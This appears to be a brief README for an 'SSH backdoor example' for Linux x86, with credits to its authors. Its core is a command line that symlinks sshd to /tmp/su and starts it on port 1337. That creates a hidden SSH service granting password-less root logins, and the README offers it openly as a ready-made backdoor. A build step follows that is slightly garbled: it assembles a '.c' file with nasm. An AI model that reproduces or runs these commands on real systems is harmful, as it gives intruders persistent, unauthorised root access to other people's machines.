# sshd-backdoor-example- linux-x86
SSH Backdoor example !
@by lizard2h;
@thanks to k3nsh1n for "instiga" ;)

## Compile ASM
strace -e execve,symlink ./a.out 
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1337;

OR $nasm -f elf shellcode.c and ld -s -o shellcode shellcode.o
